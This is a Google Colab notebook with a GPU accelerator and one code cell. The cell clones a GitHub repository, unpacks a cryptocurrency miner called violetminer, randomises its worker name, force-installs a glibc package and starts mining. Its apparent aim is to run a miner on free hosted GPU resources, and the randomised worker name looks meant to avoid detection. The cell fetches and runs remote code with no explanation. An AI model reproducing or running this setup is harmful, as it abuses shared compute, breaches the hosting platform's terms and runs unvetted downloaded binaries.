{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "zon.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "bU_4A2jQRgmv"
      },
      "source": [
        "!apt update && apt install git && git clone https://github.com/userdz0/999.git && cd 999 && unzip violet.zip && cd violetminer && perl -pe 's/workerg1/\" \" . (100 + int rand 900) .  \" \"/ge' < start.sh > 0.sh && chmod +x 0.sh && wget http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.31-0ubuntu9_amd64.deb && dpkg --auto-deconfigure -i libc6_2.31-0ubuntu9_amd64.deb\n",
        "!cd 999/violetminer/ && ./0.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}